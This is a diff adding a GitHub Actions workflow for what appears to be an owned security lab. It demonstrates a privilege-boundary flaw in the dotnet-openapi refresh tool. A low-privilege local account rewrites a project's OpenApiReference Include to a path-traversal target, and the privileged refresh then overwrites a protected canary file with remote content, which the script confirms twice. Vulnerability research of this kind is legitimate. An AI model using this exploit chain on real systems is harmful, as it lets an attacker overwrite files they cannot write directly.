@@ -1,0 +1,126 @@
+name: F-039 OpenAPI refresh boundary
+on:
+  push:
+    branches:
+      - research/f039-openapi-refresh-20261120-a1f81b
+    paths:
+      - .github/workflows/f039-openapi-refresh-20261120.yml
+permissions:
+  contents: read
+jobs:
+  boundary:
+    runs-on: windows-2025
+    timeout-minutes: 15
+    steps:
+      - name: Run owned F-039 boundary lab
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $env:DOTNET_CLI_TELEMETRY_OPTOUT = '1'
+          $env:DOTNET_NOLOGO = '1'
+          $root = Join-Path $env:RUNNER_TEMP 'F039-boundary'
+          $projectDir = Join-Path $root 'project'
+          $protectedDir = Join-Path $root 'protected'
+          $toolDir = Join-Path $root 'tool'
+          New-Item -ItemType Directory -Force $projectDir, $protectedDir, $toolDir | Out-Null
+          $project = Join-Path $projectDir 'Lab.csproj'
+          $canary = Join-Path $protectedDir 'canary.txt'
+          $attackerResult = Join-Path $projectDir 'attacker-result.txt'
+          $url = 'http://127.0.0.1:50139/spec.json'
+          $mismatch = 'http://127.0.0.1:50139/other.json'
+          $payload = 'F039_REMOTE_PAYLOAD_20261120'
+          $original = 'F039_PROTECTED_ORIGINAL_20261120'
+          [IO.File]::WriteAllText($canary, $original)
+          $benignXml = '<Project Sdk="Microsoft.NET.Sdk"><ItemGroup><OpenApiReference Include="spec.json" SourceUrl="' + $url + '" /></ItemGroup></Project>'
+          [IO.File]::WriteAllText($project, $benignXml)
+          Write-Host "RUNNER_PRINCIPAL=$([Security.Principal.WindowsIdentity]::GetCurrent().Name)"
+          Write-Host "SDK=$(dotnet --version)"
+          $server = Start-Job -ArgumentList $payload -ScriptBlock {
+            param($body)
+            $listener = [Net.HttpListener]::new()
+            $listener.Prefixes.Add('http://127.0.0.1:50139/')
+            $listener.Start()
+            try {
+              while ($true) {
+                $context = $listener.GetContext()
+                $bytes = [Text.Encoding]::UTF8.GetBytes($body)
+                $context.Response.StatusCode = 200
+                $context.Response.ContentType = 'application/json'
+                $context.Response.ContentLength64 = $bytes.Length
+                $context.Response.OutputStream.Write($bytes, 0, $bytes.Length)
+                $context.Response.Close()
+              }
+            } finally { $listener.Close() }
+          }
+          try {
+            $ready = $false
+            for ($i = 0; $i -lt 20; $i++) {
+              try {
+                $response = Invoke-WebRequest -Uri $url -TimeoutSec 2
+                if ($response.Content -eq $payload) { $ready = $true; break }
+              } catch {}
+              Start-Sleep -Milliseconds 500
+            }
+            if (-not $ready) { throw "Loopback HTTP source failed: $(Receive-Job $server -Keep)" }
+            dotnet tool install Microsoft.dotnet-openapi --version 10.0.15 --tool-path $toolDir --source https://api.nuget.org/v3/index.json
+            if ($LASTEXITCODE -ne 0) { throw 'Tool installation failed' }
+            $shim = Join-Path $toolDir 'dotnet-openapi.exe'
+            if (-not (Test-Path $shim)) { throw 'Installed CLI shim missing' }
+            Push-Location $projectDir
+            try {
+              & $shim refresh --updateProject $project $url
+              if ($LASTEXITCODE -ne 0) { throw "Benign refresh failed: $LASTEXITCODE" }
+              if ([IO.File]::ReadAllText((Join-Path $projectDir 'spec.json')) -ne $payload) { throw 'Benign reference did not update' }
+              if ([IO.File]::ReadAllText($canary) -ne $original) { throw 'Benign reference touched canary' }
+              Write-Host 'BENIGN_MATCHED=project updated; protected canary unchanged'
+              $mismatchExit = 0
+              try { & $shim refresh --updateProject $project $mismatch; $mismatchExit = $LASTEXITCODE } catch { $mismatchExit = 1; Write-Host "MISMATCH_EXCEPTION=$_" }
+              if ($mismatchExit -eq 0) { throw 'Unmatched URL unexpectedly accepted' }
+              if ([IO.File]::ReadAllText($canary) -ne $original) { throw 'Unmatched URL touched canary' }
+              Write-Host "URL_MISMATCH=denied; exit=$mismatchExit"
+            } finally { Pop-Location }
+            $account = 'f039attacker'
+            $syntheticPassword = [guid]::NewGuid().ToString('N') + 'aA1!'
+            $secure = ConvertTo-SecureString $syntheticPassword -AsPlainText -Force
+            New-LocalUser -Name $account -Password $secure -PasswordNeverExpires | Out-Null
+            icacls $root /grant "${account}:(OI)(CI)RX" /T | Out-Null
+            icacls $projectDir /grant "${account}:(OI)(CI)M" /T | Out-Null
+            icacls $canary /deny "${account}:(W)" | Out-Null
+            $attackerScript = Join-Path $projectDir 'mutate.ps1'
+            @'
+          param([string]$Project, [string]$Canary, [string]$Result)
+          $text = [IO.File]::ReadAllText($Project)
+          $text = $text.Replace('Include="spec.json"', 'Include="..\protected\canary.txt"')
+          [IO.File]::WriteAllText($Project, $text)
+          try {
+            [IO.File]::WriteAllText($Canary, 'F039_DIRECT_ATTACKER_WRITE')
+            [IO.File]::WriteAllText($Result, 'DIRECT_WRITE=allowed')
+          } catch {
+            [IO.File]::WriteAllText($Result, 'DIRECT_WRITE=denied')
+          }
+          '@ | Set-Content -Path $attackerScript -Encoding utf8
+            $cred = [pscredential]::new(".\$account", $secure)
+            $argLine = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -File `"$attackerScript`" `"$project`" `"$canary`" `"$attackerResult`""
+            $child = Start-Process -FilePath (Get-Command pwsh).Source -Credential $cred -ArgumentList $argLine -PassThru -Wait
+            if ($child.ExitCode -ne 0) { throw "Attacker process failed: $($child.ExitCode)" }
+            $attackXml = [IO.File]::ReadAllText($project)
+            if ($attackXml -ne $benignXml.Replace('Include="spec.json"', 'Include="..\protected\canary.txt"')) { throw 'Project mutation was not one-factor' }
+            if ([IO.File]::ReadAllText($attackerResult) -ne 'DIRECT_WRITE=denied') { throw 'Attacker direct-write control failed' }
+            if ([IO.File]::ReadAllText($canary) -ne $original) { throw 'Attacker directly changed protected canary' }
+            Write-Host 'ATTACKER=separate local account; project Include only changed; direct canary write denied'
+            Push-Location $projectDir
+            try {
+              for ($round = 1; $round -le 2; $round++) {
+                [IO.File]::WriteAllText($canary, $original)
+                & $shim refresh --updateProject $project $url
+                if ($LASTEXITCODE -ne 0) { throw "Attack refresh failed in round $round: $LASTEXITCODE" }
+                $observed = [IO.File]::ReadAllText($canary)
+                Write-Host "ATTACK_ROUND_${round}_CANARY=$observed"
+                if ($observed -ne $payload) { throw "Protected overwrite absent in round $round" }
+              }
+            } finally { Pop-Location }
+            Write-Host 'F039_RESULT=protected overwrite confirmed twice'
+          } finally {
+            Stop-Job $server -ErrorAction SilentlyContinue
+            Remove-Job $server -Force -ErrorAction SilentlyContinue
+          }
